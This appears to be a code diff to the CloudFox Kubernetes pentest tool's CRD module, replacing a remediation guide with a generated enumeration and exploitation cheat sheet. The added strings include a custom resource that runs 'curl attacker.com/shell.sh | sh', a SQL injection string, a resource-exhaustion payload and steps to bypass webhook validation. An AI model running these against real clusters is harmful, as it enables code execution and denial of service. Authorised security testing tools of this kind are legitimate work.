@@ -1,13 +1,13 @@
 package commands
 
 import (
-	"context"
 	"fmt"
 	"sort"
 	"strings"
 
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
+	"github.com/BishopFox/cloudfox/kubernetes/shared"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/spf13/cobra"
 	apiextensionsv1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1"
@@ -73,14 +73,15 @@ type CRDAnalysis struct {
 }
 
 const (
-	CRDRiskCritical = "CRITICAL"
-	CRDRiskHigh     = "HIGH"
-	CRDRiskMedium   = "MEDIUM"
-	CRDRiskLow      = "LOW"
+	CRDRiskCritical = shared.RiskCritical
+	CRDRiskHigh     = shared.RiskHigh
+	CRDRiskMedium   = shared.RiskMedium
+	CRDRiskLow      = shared.RiskLow
 )
 
 func ListCRDs(cmd *cobra.Command, args []string) {
-	ctx := context.Background()
+	ctx, cancel := shared.ContextWithTimeout()
+	defer cancel()
 	logger := internal.NewLogger()
 
 	parentCmd := cmd.Parent()
@@ -113,10 +114,7 @@ func ListCRDs(cmd *cobra.Command, args []string) {
 	}
 
 	var crdAnalyses []CRDAnalysis
-	var noValidation []string
-	var clusterScoped []string
-	var conversionWebhooks []string
-	var deprecatedVersions []string
+	loot := shared.NewLootBuilder()
 
 	// Analyze each CRD
 	for _, crd := range crds.Items {
@@ -175,50 +173,14 @@ func ListCRDs(cmd *cobra.Command, args []string) {
 		analysis.RiskScore = calculateCRDRiskScore(&analysis)
 		analysis.RiskLevel = crdRiskScoreToLevel(analysis.RiskScore)
 
-		// Categorize for loot files
-		if !analysis.HasValidation {
-			noValidation = append(noValidation, formatNoValidationCRD(&analysis))
-		}
-		if !analysis.Namespaced {
-			clusterScoped = append(clusterScoped, formatClusterScopedCRD(&analysis))
-		}
-		if analysis.HasConversionWebhook {
-			conversionWebhooks = append(conversionWebhooks, formatConversionWebhookCRD(&analysis))
-		}
-		if len(analysis.DeprecatedVersions) > 0 {
-			deprecatedVersions = append(deprecatedVersions, formatDeprecatedCRD(&analysis))
-		}
-
 		crdAnalyses = append(crdAnalyses, analysis)
 	}
 
-	// Generate loot files
-	lootFiles := []internal.LootFile{
-		{
-			Name:     "CRD-Enum",
-			Contents: formatCRDEnum(crdAnalyses),
-		},
-		{
-			Name:     "No-Validation-CRDs",
-			Contents: strings.Join(noValidation, "\n"),
-		},
-		{
-			Name:     "Cluster-Scoped-CRDs",
-			Contents: strings.Join(clusterScoped, "\n"),
-		},
-		{
-			Name:     "Conversion-Webhooks",
-			Contents: strings.Join(conversionWebhooks, "\n"),
-		},
-		{
-			Name:     "Deprecated-Versions",
-			Contents: strings.Join(deprecatedVersions, "\n"),
-		},
-		{
-			Name:     "Remediation-Guide",
-			Contents: generateCRDRemediationGuide(crdAnalyses),
-		},
-	}
+	// Generate CRD-Commands section for enumeration and exploitation
+	loot.Section("CRD-Commands").Add(generateCRDCommands(crdAnalyses))
+
+	// Build loot files
+	lootFiles := loot.Build()
 
 	// Generate table
 	crdTable := generateCRDTable(crdAnalyses)
@@ -244,10 +206,31 @@ func ListCRDs(cmd *cobra.Command, args []string) {
 
 	// Summary logging
 	if len(crds.Items) > 0 {
-		noValidationCount := len(noValidation)
-		clusterScopedCount := len(clusterScoped)
-		logger.InfoM(fmt.Sprintf("%d CRDs analyzed | No Validation: %d | Cluster-Scoped: %d | Webhooks: %d",
-			len(crds.Items), noValidationCount, clusterScopedCount, len(conversionWebhooks)),
+		noValidationCount := 0
+		clusterScopedCount := 0
+		webhooksCount := 0
+		criticalCount := 0
+		highCount := 0
+
+		for _, analysis := range crdAnalyses {
+			if !analysis.HasValidation {
+				noValidationCount++
+			}
+			if !analysis.Namespaced {
+				clusterScopedCount++
+			}
+			if analysis.HasConversionWebhook {
+				webhooksCount++
+			}
+			if analysis.RiskLevel == CRDRiskCritical {
+				criticalCount++
+			} else if analysis.RiskLevel == CRDRiskHigh {
+				highCount++
+			}
+		}
+
+		logger.InfoM(fmt.Sprintf("%d CRDs analyzed | CRITICAL: %d | HIGH: %d | No Validation: %d | Cluster-Scoped: %d | Webhooks: %d",
+			len(crds.Items), criticalCount, highCount, noValidationCount, clusterScopedCount, webhooksCount),
 			globals.K8S_CRDS_MODULE_NAME)
 	} else {
 		logger.InfoM("No CRDs found", globals.K8S_CRDS_MODULE_NAME)
@@ -332,111 +315,222 @@ func crdRiskScoreToLevel(score int) string {
 	return CRDRiskLow
 }
 
-// Formatting functions
-func formatNoValidationCRD(analysis *CRDAnalysis) string {
-	return fmt.Sprintf("[NO-VALIDATION] %s | Group: %s | Kind: %s | Risk: Data injection, no input validation",
-		analysis.Name, analysis.Group, analysis.Kind)
-}
-
-func formatClusterScopedCRD(analysis *CRDAnalysis) string {
-	return fmt.Sprintf("[CLUSTER-SCOPED] %s | Group: %s | Kind: %s | Requires cluster-admin access",
-		analysis.Name, analysis.Group, analysis.Kind)
-}
-
-func formatConversionWebhookCRD(analysis *CRDAnalysis) string {
-	return fmt.Sprintf("[WEBHOOK] %s | Group: %s | Strategy: %s | Ensure webhook endpoint is secured",
-		analysis.Name, analysis.Group, analysis.ConversionStrategy)
-}
-
-func formatDeprecatedCRD(analysis *CRDAnalysis) string {
-	return fmt.Sprintf("[DEPRECATED] %s | Group: %s | Versions: %s | Plan migration to newer versions",
-		analysis.Name, analysis.Group, strings.Join(analysis.DeprecatedVersions, ", "))
-}
-
-func formatCRDEnum(analyses []CRDAnalysis) string {
+// generateCRDCommands creates enumeration and exploitation commands for CRDs
+func generateCRDCommands(analyses []CRDAnalysis) string {
 	var lines []string
-	lines = append(lines, "=== Custom Resource Definition Security Analysis ===\n")
 
-	for _, crd := range analyses {
-		lines = append(lines, fmt.Sprintf("CRD: %s", crd.Name))
-		lines = append(lines, fmt.Sprintf("  Group: %s | Kind: %s", crd.Group, crd.Kind))
-		lines = append(lines, fmt.Sprintf("  Scope: %s", crd.Scope))
-		lines = append(lines, fmt.Sprintf("  Versions: %s (Latest: %s)", strings.Join(crd.Versions, ", "), crd.LatestVersion))
-		lines = append(lines, fmt.Sprintf("  Stored Versions: %s", strings.Join(crd.StoredVersions, ", ")))
-		lines = append(lines, fmt.Sprintf("  Has Validation: %t", crd.HasValidation))
-		lines = append(lines, fmt.Sprintf("  Conversion: %s (Webhook: %t)", crd.ConversionStrategy, crd.HasConversionWebhook))
-		lines = append(lines, fmt.Sprintf("  Subresources: Status=%t, Scale=%t", crd.HasStatus, crd.HasScale))
-		if len(crd.ShortNames) > 0 {
-			lines = append(lines, fmt.Sprintf("  Short Names: %s", strings.Join(crd.ShortNames, ", ")))
-		}
-		if len(crd.Categories) > 0 {
-			lines = append(lines, fmt.Sprintf("  Categories: %s", strings.Join(crd.Categories, ", ")))
-		}
-		lines = append(lines, fmt.Sprintf("  Risk Level: %s (Score: %d)", crd.RiskLevel, crd.RiskScore))
-		if len(crd.SecurityIssues) > 0 {
-			lines = append(lines, "  Security Issues:")
-			for _, issue := range crd.SecurityIssues {
-				lines = append(lines, fmt.Sprintf("    - %s", issue))
+	lines = append(lines, "═══════════════════════════════════════════════════════════════")
+	lines = append(lines, "         CRD ENUMERATION AND EXPLOITATION COMMANDS")
+	lines = append(lines, "═══════════════════════════════════════════════════════════════")
+	lines = append(lines, "")
+
+	// Basic enumeration
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 1. ENUMERATION - List All CRDs")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# List all Custom Resource Definitions")
+	lines = append(lines, "kubectl get crds")
+	lines = append(lines, "")
+	lines = append(lines, "# List CRDs with details")
+	lines = append(lines, "kubectl get crds -o wide")
+	lines = append(lines, "")
+	lines = append(lines, "# Get CRD as YAML/JSON for detailed analysis")
+	lines = append(lines, "kubectl get crd <crd-name> -o yaml")
+	lines = append(lines, "kubectl get crd <crd-name> -o json")
+	lines = append(lines, "")
+	lines = append(lines, "# Describe a specific CRD")
+	lines = append(lines, "kubectl describe crd <crd-name>")
+	lines = append(lines, "")
+
+	// Find CRDs without validation
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 2. IDENTIFY VULNERABLE CRDs")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# Find CRDs without validation schema (vulnerable to injection)")
+	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.versions[].schema == null or .spec.versions[].schema.openAPIV3Schema == null) | .metadata.name'")
+	lines = append(lines, "")
+	lines = append(lines, "# Find cluster-scoped CRDs (broad access)")
+	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.scope == \"Cluster\") | .metadata.name'")
+	lines = append(lines, "")
+	lines = append(lines, "# Find CRDs with conversion webhooks")
+	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.conversion.strategy == \"Webhook\") | {name: .metadata.name, webhook: .spec.conversion.webhook}'")
+	lines = append(lines, "")
+	lines = append(lines, "# Find CRDs with deprecated versions")
+	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.versions[].deprecated == true) | .metadata.name'")
+	lines = append(lines, "")
+
+	// Enumerate custom resources
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 3. ENUMERATE CUSTOM RESOURCES")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# List all custom resources of a specific CRD")
+	lines = append(lines, "kubectl get <resource-plural> --all-namespaces")
+	lines = append(lines, "kubectl get <resource-plural> -A -o yaml")
+	lines = append(lines, "")
+	lines = append(lines, "# Get specific custom resource")
+	lines = append(lines, "kubectl get <resource-plural> <name> -n <namespace> -o yaml")
+	lines = append(lines, "")
+
+	// Specific commands for discovered CRDs
+	if len(analyses) > 0 {
+		lines = append(lines, "# Discovered CRDs - enumerate their resources:")
+		for _, crd := range analyses {
+			plural := strings.ToLower(crd.Kind) + "s"
+			if len(crd.ShortNames) > 0 {
+				lines = append(lines, fmt.Sprintf("kubectl get %s -A  # %s (shortname: %s)", plural, crd.Name, strings.Join(crd.ShortNames, ",")))
+			} else {
+				lines = append(lines, fmt.Sprintf("kubectl get %s -A  # %s", plural, crd.Name))
 			}
 		}
 		lines = append(lines, "")
 	}
 
-	return strings.Join(lines, "\n")
-}
-
-func generateCRDRemediationGuide(analyses []CRDAnalysis) string {
-	var lines []string
-	lines = append(lines, "=== CRD Security Remediation Guide ===\n")
-
-	lines = append(lines, "# View all CRDs:")
-	lines = append(lines, "kubectl get crds")
+	// RBAC analysis
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 4. RBAC ANALYSIS FOR CRDs")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# Check your permissions on CRDs")
+	lines = append(lines, "kubectl auth can-i list customresourcedefinitions")
+	lines = append(lines, "kubectl auth can-i create customresourcedefinitions")
+	lines = append(lines, "kubectl auth can-i delete customresourcedefinitions")
+	lines = append(lines, "")
+	lines = append(lines, "# Check permissions on specific custom resource types")
+	lines = append(lines, "kubectl auth can-i --list | grep -E '<resource-group>'")
+	lines = append(lines, "")
+	lines = append(lines, "# Find roles/clusterroles that grant CRD access")
+	lines = append(lines, "kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.resources[]? | contains(\"customresourcedefinitions\")) | .metadata.name'")
+	lines = append(lines, "")
+	lines = append(lines, "# Find who can create/modify specific custom resources")
+	lines = append(lines, "kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name | test(\"admin|edit\")) | {binding: .metadata.name, subjects: .subjects}'")
 	lines = append(lines, "")
 
-	lines = append(lines, "# Describe a specific CRD:")
-	lines = append(lines, "kubectl describe crd <crd-name>")
+	// Exploitation techniques
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 5. EXPLOITATION - No Validation CRDs")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# CRDs without validation accept arbitrary data")
+	lines = append(lines, "# This can be exploited for:")
+	lines = append(lines, "#   - Data injection into controllers")
+	lines = append(lines, "#   - Resource exhaustion (large payloads)")
+	lines = append(lines, "#   - Application-specific exploits")
+	lines = append(lines, "")
+	lines = append(lines, "# Example: Create resource with arbitrary fields (no validation)")
+	lines = append(lines, "cat <<EOF | kubectl apply -f -")
+	lines = append(lines, "apiVersion: <group>/<version>")
+	lines = append(lines, "kind: <Kind>")
+	lines = append(lines, "metadata:")
+	lines = append(lines, "  name: test-injection")
+	lines = append(lines, "  namespace: default")
+	lines = append(lines, "spec:")
+	lines = append(lines, "  # Arbitrary fields accepted without validation")
+	lines = append(lines, "  maliciousField: \"'; DROP TABLE users;--\"")
+	lines = append(lines, "  command: [\"sh\", \"-c\", \"curl attacker.com/shell.sh | sh\"]")
+	lines = append(lines, "  largePayload: \"$(python -c 'print(\\\"A\\\"*1000000)')\"")
+	lines = append(lines, "EOF")
 	lines = append(lines, "")
 
-	lines = append(lines, "# Get custom resources of a specific CRD:")
-	lines = append(lines, "kubectl get <resource-plural> --all-namespaces")
-	lines = append(lines, "")
-
-	lines = append(lines, "# Delete unused CRD (warning: deletes all custom resources):")
-	lines = append(lines, "kubectl delete crd <crd-name>")
-	lines = append(lines, "")
-
-	lines = append(lines, "## Security Best Practices:\n")
-	lines = append(lines, "# 1. Always define OpenAPI v3 validation schema in CRD spec")
-	lines = append(lines, "# 2. Use namespace-scoped CRDs when possible (avoid cluster-scoped)")
-	lines = append(lines, "# 3. Implement proper RBAC for custom resources")
-	lines = append(lines, "# 4. Validate conversion webhook configurations")
-	lines = append(lines, "# 5. Plan for version migrations (avoid serving deprecated versions)")
-	lines = append(lines, "# 6. Use status subresource to separate spec and status updates")
-	lines = append(lines, "")
-
-	lines = append(lines, "## Specific Issues:\n")
-
+	// CRD-specific exploitation commands
+	noValidationCRDs := []CRDAnalysis{}
 	for _, crd := range analyses {
-		if crd.RiskScore >= 50 {
-			lines = append(lines, fmt.Sprintf("# High-risk CRD: %s (Score: %d)", crd.Name, crd.RiskScore))
-			for _, issue := range crd.SecurityIssues {
-				lines = append(lines, fmt.Sprintf("#   - %s", issue))
-			}
-			if !crd.HasValidation {
-				lines = append(lines, "#   ACTION: Add OpenAPI v3 schema validation to CRD definition")
-			}
-			if !crd.Namespaced {
-				lines = append(lines, "#   ACTION: Consider converting to namespace-scoped if possible")
-			}
-			lines = append(lines, "")
+		if !crd.HasValidation {
+			noValidationCRDs = append(noValidationCRDs, crd)
 		}
 	}
+
+	if len(noValidationCRDs) > 0 {
+		lines = append(lines, "# Specific commands for CRDs without validation:")
+		for _, crd := range noValidationCRDs {
+			lines = append(lines, fmt.Sprintf("\n# [CRITICAL] %s (Group: %s)", crd.Name, crd.Group))
+			lines = append(lines, fmt.Sprintf("# No validation - arbitrary data injection possible"))
+			lines = append(lines, fmt.Sprintf("kubectl get %s -A -o yaml", strings.ToLower(crd.Kind)+"s"))
+			lines = append(lines, fmt.Sprintf("kubectl describe crd %s | grep -A 20 'Schema'", crd.Name))
+		}
+		lines = append(lines, "")
+	}
+
+	// Webhook exploitation
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 6. EXPLOITATION - Webhook Bypass")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# If conversion webhook has failurePolicy: Ignore")
+	lines = append(lines, "# Taking down the webhook allows bypassing validation")
+	lines = append(lines, "")
+	lines = append(lines, "# Check webhook configuration")
+	lines = append(lines, "kubectl get crd <crd-name> -o jsonpath='{.spec.conversion}'")
+	lines = append(lines, "")
+	lines = append(lines, "# Find webhook service")
+	lines = append(lines, "kubectl get crd <crd-name> -o json | jq '.spec.conversion.webhook.clientConfig'")
+	lines = append(lines, "")
+	lines = append(lines, "# Check if webhook service exists")
+	lines = append(lines, "kubectl get svc -n <webhook-namespace> <webhook-service>")
+	lines = append(lines, "")
+	lines = append(lines, "# If you can delete the webhook service (requires permissions):")
+	lines = append(lines, "# kubectl delete svc <webhook-service> -n <webhook-namespace>")
+	lines = append(lines, "# Then create resources that bypass validation")
+	lines = append(lines, "")
+
+	// Privilege escalation via CRDs
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 7. PRIVILEGE ESCALATION VIA CRDs")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# If you can create CRDs, you might be able to:")
+	lines = append(lines, "#   1. Create a CRD without validation")
+	lines = append(lines, "#   2. Create custom resources with malicious data")
+	lines = append(lines, "#   3. Exploit controllers that process those resources")
+	lines = append(lines, "")
+	lines = append(lines, "# Check if you can create CRDs")
+	lines = append(lines, "kubectl auth can-i create customresourcedefinitions")
+	lines = append(lines, "")
+	lines = append(lines, "# Create a minimal CRD (if permitted)")
+	lines = append(lines, "cat <<EOF | kubectl apply -f -")
+	lines = append(lines, "apiVersion: apiextensions.k8s.io/v1")
+	lines = append(lines, "kind: CustomResourceDefinition")
+	lines = append(lines, "metadata:")
+	lines = append(lines, "  name: exploits.attacker.example.com")
+	lines = append(lines, "spec:")
+	lines = append(lines, "  group: attacker.example.com")
+	lines = append(lines, "  names:")
+	lines = append(lines, "    kind: Exploit")
+	lines = append(lines, "    plural: exploits")
+	lines = append(lines, "  scope: Namespaced")
+	lines = append(lines, "  versions:")
+	lines = append(lines, "  - name: v1")
+	lines = append(lines, "    served: true")
+	lines = append(lines, "    storage: true")
+	lines = append(lines, "    # No validation schema = accepts anything")
+	lines = append(lines, "    schema:")
+	lines = append(lines, "      openAPIV3Schema:")
+	lines = append(lines, "        type: object")
+	lines = append(lines, "        x-kubernetes-preserve-unknown-fields: true")
+	lines = append(lines, "EOF")
+	lines = append(lines, "")
+
+	// Cleanup
+	lines = append(lines, "##############################################")
+	lines = append(lines, "## 8. CLEANUP / DELETE CRDs")
+	lines = append(lines, "##############################################")
+	lines = append(lines, "")
+	lines = append(lines, "# WARNING: Deleting a CRD deletes ALL custom resources of that type!")
+	lines = append(lines, "")
+	lines = append(lines, "# Delete a CRD (and all its custom resources)")
+	lines = append(lines, "kubectl delete crd <crd-name>")
+	lines = append(lines, "")
+	lines = append(lines, "# Delete specific custom resource")
+	lines = append(lines, "kubectl delete <resource-plural> <name> -n <namespace>")
+	lines = append(lines, "")
 
 	return strings.Join(lines, "\n")
 }
 
 func generateCRDTable(analyses []CRDAnalysis) internal.TableFile {
-	header := []string{"Name", "Group", "Kind", "Scope", "Versions", "Validation", "Webhook", "Status", "Risk", "Score"}
+	header := []string{"Name", "Group", "Kind", "Scope", "Versions", "Validation", "Webhook", "Status"}
 	var rows [][]string
 
 	// Sort by risk score
@@ -456,11 +550,9 @@ func generateCRDTable(analyses []CRDAnalysis) internal.TableFile {
 			crd.Kind,
 			crd.Scope,
 			versionsStr,
-			fmt.Sprintf("%t", crd.HasValidation),
-			fmt.Sprintf("%t", crd.HasConversionWebhook),
-			fmt.Sprintf("%t", crd.HasStatus),
-			crd.RiskLevel,
-			fmt.Sprintf("%d", crd.RiskScore),
+			shared.FormatBool(crd.HasValidation),
+			shared.FormatBool(crd.HasConversionWebhook),
+			shared.FormatBool(crd.HasStatus),
 		})
 	}
 
